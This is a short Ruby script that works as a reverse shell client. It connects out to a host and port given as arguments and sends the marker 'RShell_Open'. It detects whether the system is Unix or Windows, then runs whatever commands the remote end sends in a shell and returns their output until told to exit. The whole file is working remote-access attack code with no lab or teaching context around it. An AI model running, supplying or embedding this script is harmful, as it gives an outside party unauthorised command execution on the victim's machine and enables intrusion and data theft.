require "socket"

host = ARGV[0]
port = ARGV[1].to_i
host = TCPSocket.open(host, port)
host.puts "RShell_Open"

	if system("pwd")
		currentDirCommand = "pwd"
		joiner = "\; "
	elsif system("cd")
		currentDirCommand = "cd"
		joiner = "\& "
	end
	currentDir = `#{currentDirCommand}`.chomp
	host.puts currentDirCommand
	loop do
		cmd = host.gets.chomp
		if cmd.downcase == "exit"
			host.close
			break
		else
			begin
				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
					currentDir = `cd "#{currentDir}"#{joiner}#{cmd}#{joiner}#{currentDirCommand}`.chomp
					out = ""
				else
					out = `cd "#{currentDir}"#{joiner}#{cmd.chomp}`
				end
			rescue
				out = "Unable to execute command"
			end
			host.puts out.gsub("\n", "\\NEWLINE")
		end
	end